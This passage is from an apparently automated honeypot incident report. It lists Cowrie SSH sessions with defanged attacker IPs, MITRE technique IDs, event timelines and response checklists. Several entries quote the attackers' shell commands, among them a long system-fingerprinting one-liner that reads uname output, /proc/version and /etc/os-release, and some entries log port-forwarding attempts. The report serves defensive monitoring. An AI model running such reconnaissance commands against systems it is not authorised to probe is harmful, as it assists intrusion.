| `2026-07-24 06:16:36` | `cowrie.log.closed` |
| `2026-07-24 06:16:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f90a2f8c27b

| Field | Detail |
|---|---|
| **Source IP** | `188.59.90[.]54` |
| **First Seen** | 2026-07-24 06:16 |
| **Last Seen** | 2026-07-24 06:17 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:16:43` | `cowrie.session.connect` |
| `2026-07-24 06:16:47` | `cowrie.client.version` |
| `2026-07-24 06:16:47` | `cowrie.client.kex` |
| `2026-07-24 06:16:55` | `cowrie.login.success` |
| `2026-07-24 06:16:58` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.59.90[.]54` to AbuseIPDB if not already reported
- [ ] Block `188.59.90[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30ee9ae63ad6

| Field | Detail |
|---|---|
| **Source IP** | `113.219.177[.]95` |
| **First Seen** | 2026-07-24 06:17 |
| **Last Seen** | 2026-07-24 06:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:17:02` | `cowrie.session.connect` |
| `2026-07-24 06:17:03` | `cowrie.client.version` |
| `2026-07-24 06:17:03` | `cowrie.client.kex` |
| `2026-07-24 06:17:05` | `cowrie.login.success` |
| `2026-07-24 06:17:06` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.219.177[.]95` to AbuseIPDB if not already reported
- [ ] Block `113.219.177[.]95` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07aa97a31203

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 06:17 |
| **Last Seen** | 2026-07-24 06:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:17:32` | `cowrie.session.connect` |
| `2026-07-24 06:17:33` | `cowrie.client.version` |
| `2026-07-24 06:17:33` | `cowrie.client.kex` |
| `2026-07-24 06:17:36` | `cowrie.login.success` |
| `2026-07-24 06:17:39` | `cowrie.session.params` |
| `2026-07-24 06:17:39` | `cowrie.command.input` |
| `2026-07-24 06:17:39` | `cowrie.command.input` |
| `2026-07-24 06:17:39` | `cowrie.command.input` |
| `2026-07-24 06:17:39` | `cowrie.command.input` |
| `2026-07-24 06:17:39` | `cowrie.command.input` |
| `2026-07-24 06:17:39` | `cowrie.command.success` |
| `2026-07-24 06:17:39` | `cowrie.command.input` |
| `2026-07-24 06:17:39` | `cowrie.command.input` |
| `2026-07-24 06:17:39` | `cowrie.command.input` |
| `2026-07-24 06:17:39` | `cowrie.command.input` |
| `2026-07-24 06:17:40` | `cowrie.log.closed` |
| `2026-07-24 06:17:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff857e770d18

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:18 |
| **Last Seen** | 2026-07-24 06:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:18:23` | `cowrie.session.connect` |
| `2026-07-24 06:18:23` | `cowrie.client.version` |
| `2026-07-24 06:18:23` | `cowrie.client.kex` |
| `2026-07-24 06:18:23` | `cowrie.login.success` |
| `2026-07-24 06:18:24` | `cowrie.session.params` |
| `2026-07-24 06:18:24` | `cowrie.command.input` |
| `2026-07-24 06:18:24` | `cowrie.log.closed` |
| `2026-07-24 06:18:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af86ac1621c8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 06:19 |
| **Last Seen** | 2026-07-24 06:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:19:38` | `cowrie.session.connect` |
| `2026-07-24 06:19:38` | `cowrie.client.version` |
| `2026-07-24 06:19:38` | `cowrie.client.kex` |
| `2026-07-24 06:19:41` | `cowrie.login.success` |
| `2026-07-24 06:19:44` | `cowrie.session.params` |
| `2026-07-24 06:19:44` | `cowrie.command.input` |
| `2026-07-24 06:19:44` | `cowrie.command.input` |
| `2026-07-24 06:19:44` | `cowrie.command.input` |
| `2026-07-24 06:19:44` | `cowrie.command.input` |
| `2026-07-24 06:19:44` | `cowrie.command.input` |
| `2026-07-24 06:19:44` | `cowrie.command.success` |
| `2026-07-24 06:19:44` | `cowrie.command.input` |
| `2026-07-24 06:19:44` | `cowrie.command.input` |
| `2026-07-24 06:19:44` | `cowrie.command.input` |
| `2026-07-24 06:19:44` | `cowrie.command.input` |
| `2026-07-24 06:19:45` | `cowrie.log.closed` |
| `2026-07-24 06:19:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-698808535e07

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:20 |
| **Last Seen** | 2026-07-24 06:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:20:08` | `cowrie.session.connect` |
| `2026-07-24 06:20:08` | `cowrie.client.version` |
| `2026-07-24 06:20:08` | `cowrie.client.kex` |
| `2026-07-24 06:20:09` | `cowrie.login.success` |
| `2026-07-24 06:20:10` | `cowrie.session.params` |
| `2026-07-24 06:20:10` | `cowrie.command.input` |
| `2026-07-24 06:20:10` | `cowrie.log.closed` |
| `2026-07-24 06:20:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f1205fb05ed

| Field | Detail |
|---|---|
| **Source IP** | `59.93.36[.]136` |
| **First Seen** | 2026-07-24 06:21 |
| **Last Seen** | 2026-07-24 06:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:21:13` | `cowrie.session.connect` |
| `2026-07-24 06:21:14` | `cowrie.client.version` |
| `2026-07-24 06:21:14` | `cowrie.client.kex` |
| `2026-07-24 06:21:16` | `cowrie.login.success` |
| `2026-07-24 06:21:16` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.93.36[.]136` to AbuseIPDB if not already reported
- [ ] Block `59.93.36[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e08e438e23f

| Field | Detail |
|---|---|
| **Source IP** | `177.174.105[.]113` |
| **First Seen** | 2026-07-24 06:21 |
| **Last Seen** | 2026-07-24 06:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:21:21` | `cowrie.session.connect` |
| `2026-07-24 06:21:22` | `cowrie.client.version` |
| `2026-07-24 06:21:22` | `cowrie.client.kex` |
| `2026-07-24 06:21:23` | `cowrie.login.success` |
| `2026-07-24 06:21:24` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:21:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.105[.]113` to AbuseIPDB if not already reported
- [ ] Block `177.174.105[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3e489acece8

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:21 |
| **Last Seen** | 2026-07-24 06:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:21:57` | `cowrie.session.connect` |
| `2026-07-24 06:21:57` | `cowrie.client.version` |
| `2026-07-24 06:21:57` | `cowrie.client.kex` |
| `2026-07-24 06:21:58` | `cowrie.login.success` |
| `2026-07-24 06:21:58` | `cowrie.session.params` |
| `2026-07-24 06:21:58` | `cowrie.command.input` |
| `2026-07-24 06:21:58` | `cowrie.log.closed` |
| `2026-07-24 06:21:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77093edacb2d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:23 |
| **Last Seen** | 2026-07-24 06:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:23:42` | `cowrie.session.connect` |
| `2026-07-24 06:23:42` | `cowrie.client.version` |
| `2026-07-24 06:23:42` | `cowrie.client.kex` |
| `2026-07-24 06:23:42` | `cowrie.login.success` |
| `2026-07-24 06:23:43` | `cowrie.session.params` |
| `2026-07-24 06:23:43` | `cowrie.command.input` |
| `2026-07-24 06:23:43` | `cowrie.log.closed` |
| `2026-07-24 06:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ae0af090a2

| Field | Detail |
|---|---|
| **Source IP** | `117.211.77[.]86` |
| **First Seen** | 2026-07-24 06:24 |
| **Last Seen** | 2026-07-24 06:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:24:25` | `cowrie.session.connect` |
| `2026-07-24 06:24:25` | `cowrie.client.version` |
| `2026-07-24 06:24:25` | `cowrie.client.kex` |
| `2026-07-24 06:24:28` | `cowrie.login.success` |
| `2026-07-24 06:24:29` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.77[.]86` to AbuseIPDB if not already reported
- [ ] Block `117.211.77[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87f7bd016f29

| Field | Detail |
|---|---|
| **Source IP** | `128.185.12[.]179` |
| **First Seen** | 2026-07-24 06:24 |
| **Last Seen** | 2026-07-24 06:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:24:34` | `cowrie.session.connect` |
| `2026-07-24 06:24:35` | `cowrie.client.version` |
| `2026-07-24 06:24:35` | `cowrie.client.kex` |
| `2026-07-24 06:24:37` | `cowrie.login.success` |
| `2026-07-24 06:24:37` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.185.12[.]179` to AbuseIPDB if not already reported
- [ ] Block `128.185.12[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c7aa2d235b0

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:25 |
| **Last Seen** | 2026-07-24 06:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:25:25` | `cowrie.session.connect` |
| `2026-07-24 06:25:25` | `cowrie.client.version` |
| `2026-07-24 06:25:25` | `cowrie.client.kex` |
| `2026-07-24 06:25:25` | `cowrie.login.success` |
| `2026-07-24 06:25:26` | `cowrie.session.params` |
| `2026-07-24 06:25:26` | `cowrie.command.input` |
| `2026-07-24 06:25:26` | `cowrie.log.closed` |
| `2026-07-24 06:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bece882ad1bc

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:27 |
| **Last Seen** | 2026-07-24 06:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:27:12` | `cowrie.session.connect` |
| `2026-07-24 06:27:12` | `cowrie.client.version` |
| `2026-07-24 06:27:12` | `cowrie.client.kex` |
| `2026-07-24 06:27:13` | `cowrie.login.success` |
| `2026-07-24 06:27:13` | `cowrie.session.params` |
| `2026-07-24 06:27:13` | `cowrie.command.input` |
| `2026-07-24 06:27:13` | `cowrie.log.closed` |
| `2026-07-24 06:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bef2837bcb63

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:29 |
| **Last Seen** | 2026-07-24 06:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:29:03` | `cowrie.session.connect` |
| `2026-07-24 06:29:03` | `cowrie.client.version` |
| `2026-07-24 06:29:03` | `cowrie.client.kex` |
| `2026-07-24 06:29:04` | `cowrie.login.success` |
| `2026-07-24 06:29:05` | `cowrie.session.params` |
| `2026-07-24 06:29:05` | `cowrie.command.input` |
| `2026-07-24 06:29:05` | `cowrie.log.closed` |
| `2026-07-24 06:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3ddb8213e42

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:30 |
| **Last Seen** | 2026-07-24 06:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:30:54` | `cowrie.session.connect` |
| `2026-07-24 06:30:54` | `cowrie.client.version` |
| `2026-07-24 06:30:54` | `cowrie.client.kex` |
| `2026-07-24 06:30:54` | `cowrie.login.success` |
| `2026-07-24 06:30:55` | `cowrie.session.params` |
| `2026-07-24 06:30:55` | `cowrie.command.input` |
| `2026-07-24 06:30:55` | `cowrie.log.closed` |
| `2026-07-24 06:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88e9992cdc7e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:32 |
| **Last Seen** | 2026-07-24 06:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:32:44` | `cowrie.session.connect` |
| `2026-07-24 06:32:44` | `cowrie.client.version` |
| `2026-07-24 06:32:44` | `cowrie.client.kex` |
| `2026-07-24 06:32:44` | `cowrie.login.success` |
| `2026-07-24 06:32:45` | `cowrie.session.params` |
| `2026-07-24 06:32:45` | `cowrie.command.input` |
| `2026-07-24 06:32:45` | `cowrie.log.closed` |
| `2026-07-24 06:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f9cf25ac12a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:34 |
| **Last Seen** | 2026-07-24 06:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:34:35` | `cowrie.session.connect` |
| `2026-07-24 06:34:35` | `cowrie.client.version` |
| `2026-07-24 06:34:35` | `cowrie.client.kex` |
| `2026-07-24 06:34:35` | `cowrie.login.success` |
| `2026-07-24 06:34:36` | `cowrie.session.params` |
| `2026-07-24 06:34:36` | `cowrie.command.input` |
| `2026-07-24 06:34:36` | `cowrie.log.closed` |
| `2026-07-24 06:34:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13540328e942

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:36 |
| **Last Seen** | 2026-07-24 06:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:36:22` | `cowrie.session.connect` |
| `2026-07-24 06:36:22` | `cowrie.client.version` |
| `2026-07-24 06:36:22` | `cowrie.client.kex` |
| `2026-07-24 06:36:22` | `cowrie.login.success` |
| `2026-07-24 06:36:23` | `cowrie.session.params` |
| `2026-07-24 06:36:23` | `cowrie.command.input` |
| `2026-07-24 06:36:23` | `cowrie.log.closed` |
| `2026-07-24 06:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32510573db61

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:38 |
| **Last Seen** | 2026-07-24 06:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:38:05` | `cowrie.session.connect` |
| `2026-07-24 06:38:05` | `cowrie.client.version` |
| `2026-07-24 06:38:05` | `cowrie.client.kex` |
| `2026-07-24 06:38:05` | `cowrie.login.success` |
| `2026-07-24 06:38:06` | `cowrie.session.params` |
| `2026-07-24 06:38:06` | `cowrie.command.input` |
| `2026-07-24 06:38:06` | `cowrie.log.closed` |
| `2026-07-24 06:38:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94caaa5d02ee

| Field | Detail |
|---|---|
| **Source IP** | `120.194.50[.]39` |
| **First Seen** | 2026-07-24 06:38 |
| **Last Seen** | 2026-07-24 06:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:38:24` | `cowrie.session.connect` |
| `2026-07-24 06:38:25` | `cowrie.client.version` |
| `2026-07-24 06:38:25` | `cowrie.client.kex` |
| `2026-07-24 06:38:27` | `cowrie.login.success` |
| `2026-07-24 06:38:27` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:38:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.194.50[.]39` to AbuseIPDB if not already reported
- [ ] Block `120.194.50[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baeb9e0cae5b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:39 |
| **Last Seen** | 2026-07-24 06:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:39:52` | `cowrie.session.connect` |
| `2026-07-24 06:39:52` | `cowrie.client.version` |
| `2026-07-24 06:39:52` | `cowrie.client.kex` |
| `2026-07-24 06:39:52` | `cowrie.login.success` |
| `2026-07-24 06:39:53` | `cowrie.session.params` |
| `2026-07-24 06:39:53` | `cowrie.command.input` |
| `2026-07-24 06:39:53` | `cowrie.log.closed` |
| `2026-07-24 06:39:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fc8a19edc9d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:41 |
| **Last Seen** | 2026-07-24 06:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:41:41` | `cowrie.session.connect` |
| `2026-07-24 06:41:41` | `cowrie.client.version` |
| `2026-07-24 06:41:41` | `cowrie.client.kex` |
| `2026-07-24 06:41:42` | `cowrie.login.success` |
| `2026-07-24 06:41:42` | `cowrie.session.params` |
| `2026-07-24 06:41:42` | `cowrie.command.input` |
| `2026-07-24 06:41:43` | `cowrie.log.closed` |
| `2026-07-24 06:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
